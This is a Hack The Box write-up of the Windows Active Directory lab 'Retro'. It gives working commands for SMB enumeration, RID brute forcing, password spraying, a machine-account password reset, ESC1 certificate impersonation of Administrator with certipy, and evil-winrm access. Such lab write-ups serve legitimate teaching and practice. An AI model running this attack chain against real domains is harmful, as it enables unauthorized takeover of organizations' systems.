# Retro - Hack The Box Writeup

## Machine Information

* Machine Name: Retro
* Platform: Hack The Box
* Difficulty: Easy
* Operating System: Windows
* IP Address: 10.129.234.44

---

# Summary

Retro is an Easy-rated Windows Active Directory machine that demonstrates several common enumeration and exploitation techniques in AD environments. Initial access is achieved through SMB enumeration and the discovery of weak credentials associated with a trainee account. Further enumeration reveals a pre-created machine account vulnerable to password reset abuse. The machine account is then leveraged to enumerate Active Directory Certificate Services (ADCS), ultimately identifying an ESC1 vulnerable certificate template. Exploiting this misconfiguration allows impersonation of the domain Administrator account and full compromise of the domain controller.

---

# Enumeration

## Nmap Scan

The assessment began with a full TCP port scan followed by targeted service enumeration.

```bash
sudo nmap -p- --min-rate 1000 -T4 10.129.234.44 -oA nmap/full_tcp
```

After identifying open ports, a detailed scan was performed.

```bash
ports=$(grep open nmap/full_tcp.nmap | cut -d "/" -f1 | tr '\n' ',' | sed 's/,$//')

sudo nmap -sC -sV -Pn -p$ports 10.129.234.44 -oA nmap/detail
```

The scan revealed several Active Directory related services:

* SMB (445)
* LDAP (389, 636)
* Kerberos (88)
* WinRM (5985)
* RDP (3389)
* DNS (53)

The host appeared to be a Domain Controller for the `retro.vl` domain.

Relevant hostnames were added to the local hosts file.

```bash
echo "10.129.234.44 retro.vl dc.retro.vl DC.retro.vl" | sudo tee -a /etc/hosts
```

---

# SMB Enumeration

Initial SMB enumeration was performed using NetExec.

```bash
nxc smb retro.vl -u "Guest" -p ""
```

Guest authentication was permitted.

Share enumeration identified an interesting non-default share.

```bash
nxc smb retro.vl -u "Guest" -p "" --shares
```

The `Trainees` share was accessible with Guest permissions.

## Accessing the Trainees Share

The share was accessed using `smbclient`.

```bash
smbclient //retro.vl/Trainees -U 'Guest'
```

A file named `Important.txt` was identified and downloaded.

```bash
get Important.txt
```

The contents suggested that trainee users shared weak or easily memorable passwords.

---

# RID Bruteforcing

RID brute forcing was performed to enumerate domain users.

```bash
nxc smb retro.vl -u "Guest" -p "" --rid-brute
```

Interesting accounts discovered:

* trainee
* jburley
* tblack
* BANKING$

The `BANKING$` account appeared to be a machine account due to the trailing `$` character.

---

# Credential Spraying

A small username list was created from the discovered accounts.

```bash
cat > users.txt << EOF
trainee
jburley
tblack
EOF
```

A username-as-password spray was performed.

```bash
nxc smb retro.vl -u users.txt -p users.txt --continue-on-success
```

Valid credentials were identified:

```text
retro.vl\trainee:trainee
```

---

# Accessing the Notes Share

Using the discovered credentials, the `Notes` share became accessible.

```bash
smbclient //retro.vl/Notes -U 'trainee%trainee'
```

The following files were downloaded:

```bash
get user.txt
get ToDo.txt
```

The `ToDo.txt` file referenced an old pre-created computer account used by the finance department.

This strongly suggested that the `BANKING$` machine account might still be vulnerable.

---

# Exploiting the Pre-Created Machine Account

Pre-created machine accounts may retain weak default passwords if they have never authenticated to the domain.

The default password convention is often the lowercase machine name.

An authentication attempt confirmed unusual behavior:

```bash
smbclient //retro.vl/Notes -U 'BANKING$%banking'
```

Instead of a logon failure, the following error was returned:

```text
NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

This indicated that the password was correct but the machine account trust relationship had not been established.

## Resetting the Machine Account Password

The password was reset using Impacket's `changepasswd.py`.

```bash
changepasswd.py retro.vl/'banking$':banking@10.129.234.44 -newpass 'kavi123!' -p rpc-samr
```

Authentication with the new password succeeded.

```bash
nxc smb retro.vl -u 'banking$' -p 'kavi123!'
```

---

# Active Directory Certificate Services Enumeration

LDAP enumeration was performed to identify Active Directory Certificate Services.

```bash
nxc ldap retro.vl -u "banking$" -p 'kavi123!' -M adcs
```

A Certificate Authority named `retro-DC-CA` was identified.

Further enumeration was performed using Certipy.

```bash
certipy-ad find -u 'banking$' -p 'kavi123!' -dc-ip 10.129.234.44 -vulnerable -stdout
```

The output revealed a vulnerable ESC1 certificate template:

* Template Name: RetroClients
* Enrollment Rights: Domain Computers
* Enrollee Supplies Subject: Enabled
* Client Authentication: Enabled

Because the `BANKING$` account was a member of `Domain Computers`, it could enroll in the vulnerable template.

---

# ESC1 Exploitation

The domain SID was identified through enumeration, and the built-in Administrator RID (`500`) was appended.

Administrator SID:

```text
S-1-5-21-2983547755-698260136-4283918172-500
```

A certificate request was made impersonating the Administrator account.

```bash
certipy-ad req \
-u 'banking$@retro.vl' \
-p 'kavi123!' \
-dc-ip 10.129.234.44 \
-target dc.retro.vl \
-ca retro-DC-CA \
-template RetroClients \
-upn Administrator@retro.vl \
-key-size 4096 \
-sid S-1-5-21-2983547755-698260136-4283918172-500 \
-timeout 60
```

The request successfully generated a certificate:

```text
administrator.pfx
```

---

# Schannel Authentication

Attempting PKINIT authentication resulted in the following error:

```text
KDC_ERR_PADATA_TYPE_NOSUPP
```

This indicated that PKINIT was not properly supported by the target domain controller.

Instead, Schannel authentication over LDAPS was used.

```bash
certipy-ad auth \
-pfx administrator.pfx \
-ldap-shell \
-dc-ip 10.129.234.44 \
-domain retro.vl
```

Successful authentication provided an LDAP shell as:

```text
RETRO\Administrator
```

---

# Administrator Password Reset

The LDAP shell was used to reset the Administrator password.

```text
change_password Administrator Password123!
```

---

# WinRM Access

With the new Administrator password, WinRM access was obtained.

```bash
evil-winrm -i 10.129.234.44 -u Administrator -p 'Password123!'
```

Successful shell access confirmed full compromise of the domain controller.

```powershell
whoami
```

Output:

```text
retro\administrator
```

The root flag was retrieved from:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

# Conclusion

Retro demonstrates several realistic Active Directory attack paths involving SMB enumeration, weak credential discovery, machine account abuse, and ADCS exploitation.

The machine highlights the risks associated with:

* Weak or shared passwords
* Improperly managed pre-created computer accounts
* Vulnerable ADCS certificate templates
* Excessive enrollment permissions

The final privilege escalation path leveraged ESC1 to impersonate the domain Administrator account and obtain full administrative access to the domain controller.

